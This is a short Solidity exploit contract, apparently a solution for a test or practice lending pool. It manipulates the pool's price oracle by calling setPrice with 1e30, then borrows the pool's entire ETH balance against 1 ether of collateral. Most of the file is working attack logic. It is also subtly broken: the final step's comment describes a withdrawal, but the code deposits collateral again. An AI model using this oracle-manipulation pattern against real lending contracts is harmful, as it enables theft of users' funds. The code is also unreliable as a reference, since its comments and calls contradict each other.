// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {OracleLendingPool} from "../src/OracleLendingPool.sol";

contract ExploitModule {
    OracleLendingPool public targetContract;

    constructor(address _target) payable {
        targetContract = OracleLendingPool(payable(_target));
    }

    function runExploit() external payable {
        // Step 1: Deposit collateral to the pool
        targetContract.depositCollateral{value: 1 ether}();

        // Step 2: Manipulate the oracle price to a very high value
        // This will allow us to borrow a lot more than we should be able to
        targetContract.oracle().setPrice(1e30); // Set price to 1e30

        // Step 3: Borrow a large amount of ETH from the pool
        // Due to the manipulation, we can borrow much more than our collateral should allow
        targetContract.borrow(address(targetContract).balance);

        // Step 4: Withdraw our collateral back to the pool
        // Since we've already borrowed everything from the pool, this will drain the pool
        targetContract.depositCollateral{value: 1 ether}();
    }

    receive() external payable {}
}